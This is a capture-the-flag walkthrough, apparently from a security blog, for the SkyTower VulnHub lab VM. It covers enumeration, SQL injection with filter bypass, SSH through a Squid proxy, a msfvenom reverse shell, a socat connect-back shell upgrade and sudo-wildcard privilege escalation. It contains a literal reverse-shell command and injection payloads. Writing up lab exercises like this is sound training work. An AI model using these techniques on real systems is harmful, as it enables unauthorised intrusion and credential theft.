@@ -1,0 +1,162 @@
+I"J <h2 id="vm-description">VM Description</h2>
+
+<p>This CTF was designed by Telspace Systems for the CTF at the ITWeb Security Summit and BSidesCPT (Cape Town). The aim is to test intermediate to advanced security enthusiasts in their ability to attack a system using a multi-faceted approach and obtain the “flag”.</p>
+
+<p>This VM isn’t too difficult and is a good training material for the OSCP certification.</p>
+
+<p>Download: <a href="https://www.vulnhub.com/entry/skytower-1,96/">SkyTower</a></p>
+
+<p>Author: <a href="https://www.vulnhub.com/author/telspace,90/">Telespace</a></p>
+
+<h2 id="enumeration">Enumeration</h2>
+
+<p>We configure the VM in bridge mode. In order to determine its assigned IP, we run the below command:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$arp</span><span class="nt">-scan</span> <span class="nt">-I</span> wlan0 <span class="nt">-l</span> 
+</code></pre></div></div>
+
+<h3 id="service-enumeration">Service Enumeration</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$nmap</span> <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-p-</span> <span class="nt">-oA</span> nmap/nmap 192.168.1.31
+</code></pre></div></div>
+
+<div class="row">
+  <div class="col-md-6">
+    <table class="table table-bordered">
+      <thead>
+        <tr>
+          <th>Open port</th>
+          <th>Service</th>
+          <th>Version</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td>80</td>
+          <td> Apache </td>
+          <td>2.2.22</td>
+        
+        </tr>
+        <tr>
+         <td> 3128 </td>
+          <td> squid </td>
+          <td> 3.1.20 </td>
+        </tr>
+       </tbody>
+    </table>
+  </div>
+</div>
+
+<h4 id="web-server-directory-enumeration">Web Server Directory Enumeration</h4>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$gobuster</span> <span class="nb">dir</span> <span class="nt">-u</span> http://192.168.1.31 <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt <span class="nt">-x</span> .php,.txt <span class="nt">-o</span> gobuster-80.txt
+</code></pre></div></div>
+
+<p>Gobuster finds login.php page. Let’s see what is there.</p>
+
+<p><img src="../assets/img/Walkthroughs/skytower/1.png" alt="login page" /></p>
+
+<p>It’s always a good idea to check a web page source code.</p>
+
+<p><img src="../assets/img/Walkthroughs/skytower/2.png" alt="login page src code" /></p>
+
+<p>In this case, it looks like it’s a basic login page; probably coded by a junior developer. This is good news for us because it is likely vulnerable to an SQL injection. Let’s check!</p>
+
+<p>We attempt to login using admin’ or 1=1;– as username and admin as password. Based on the response, the web server is vulnerable to an SQL injection but there is some kind of filtering that we will need to bypass.</p>
+
+<p><img src="../assets/img/Walkthroughs/skytower/3.png" alt="sql injection" /></p>
+
+<p><img src="../assets/img/Walkthroughs/skytower/4.png" alt="filter bypass" /></p>
+
+<h2 id="exploit">Exploit</h2>
+
+<p>Every time we need to bypass some kind of filtering, we need to check which characters are allowed and which are not. Burp Repeater can come in handy in this case as it allows us to easily send a modified payload without going through the web interface each time.</p>
+
+<p>We can determine that the following parameters are filtered as they are removed from the response:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>select, or, =,--
+</code></pre></div></div>
+
+<p>There are a lot of guides on how to bypass these filters including this <a href="https://www.exploit-db.com/papers/17934">article</a> in exploit-db.</p>
+
+<p><img src="../assets/img/Walkthroughs/skytower/5.png" alt="working payload" /></p>
+
+<p>Excellent. We can now read the message addressed to user John.</p>
+
+<p><img src="../assets/img/Walkthroughs/skytower/6.png" alt="Successful login" /></p>
+
+<p>Since port 22 is filtered based on our Nmap scans, we need to proxy the connection through the SQUID server. This can be easily achieved by adding this line at the end of /etc/proxychains.conf.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http	192.168.1.31 3128
+</code></pre></div></div>
+
+<p><img src="../assets/img/Walkthroughs/skytower/7.png" alt="ssh as john" /></p>
+
+<p>The connection is automatically closed but let’s see if we can still execute commands.</p>
+
+<p><img src="../assets/img/Walkthroughs/skytower/8.png" alt="bypassing shell restriction" /></p>
+
+<p>Another way to go is to upload a reverse shell to the tmp directory and execute it.</p>
+
+<p>We first need to generate a payload with Msfvenom:
+<img src="../assets/img/Walkthroughs/skytower/9.png" alt="generating payload" /></p>
+
+<p>We can now upload the file using scp:
+<img src="../assets/img/Walkthroughs/skytower/10.png" alt="Upload the file" /></p>
+
+<p>We set-up a Netcat listener and execute the file after changing its permissions:
+<img src="../assets/img/Walkthroughs/skytower/11.png" alt="Running exploit" /></p>
+
+<p><img src="../assets/img/Walkthroughs/skytower/12.png" alt="Connected as john" /></p>
+
+<p>Great. The first we need to do once we have a simple reverse shell is to upgrade to a fully interactive TTY.</p>
+
+<p>This <a href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/">article</a> by ropnop details different methods to do that. Since python is not installed on the target, we can use socat to upgrade our shell.</p>
+
+<p>We setup a listener on Kali:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$socat</span> file:<span class="sb">`</span><span class="nb">tty</span><span class="sb">`</span>,raw,echo<span class="o">=</span>0 tcp-listen:4444
+</code></pre></div></div>
+<p>And then execute the below command on the target machine:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$socat</span> <span class="nb">exec</span>:<span class="s1">'bash -li'</span>,pty,stderr,setsid,sigint,sane tcp:192.168.1.34:4444
+</code></pre></div></div>
+
+<p><img src="../assets/img/Walkthroughs/skytower/13.png" alt="TTY upgrade" /></p>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+
+<h4 id="escalating-to-user-sara">Escalating to user Sara</h4>
+
+<p>We run the automated <a href="https://github.com/rebootuser/LinEnum">LinEnum.sh</a> script to find attack vectors that can allow us to escalate to root.</p>
+
+<p>The script found Mysql credentials (root:root). Awesome. Let’s connect to mysql and see what information we have.</p>
+
+<p><img src="../assets/img/Walkthroughs/skytower/14.png" alt="mysql credentials" /></p>
+
+<p>To connect to the database, we run:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$mysql</span> <span class="nt">-u</span> root <span class="nt">-p</span>
+</code></pre></div></div>
+
+<p><img src="../assets/img/Walkthroughs/skytower/15.png" alt="users passwords" /></p>
+
+<p>We attempt to SSH as William but the password is incorrect. However, Sara’s password is valid and we can SSH as Sara as we did with John.</p>
+
+<h4 id="escalating-to-user-root">Escalating to user root</h4>
+
+<p>One of the first things to check, even before running the automatic script, is to determine if the user we are connected as is in the sudo group by executing [sudo -l].</p>
+
+<p><img src="../assets/img/Walkthroughs/skytower/16.png" alt="sudo" /></p>
+
+<p>User Sara can run /bin/cat /accounts/* and /bin/ls /accounts/* as root without supplying a password.</p>
+
+<p>Since accounts is appended with *, we can perform directory traversal and read any file on the system.</p>
+
+<p><img src="../assets/img/Walkthroughs/skytower/18.png" alt="flag" /></p>
+
+<p>We have the root user password. Let’s connect as root. Mission complete :)</p>
+
+<p><img src="../assets/img/Walkthroughs/skytower/19.png" alt="root" /></p>
+
+:ET
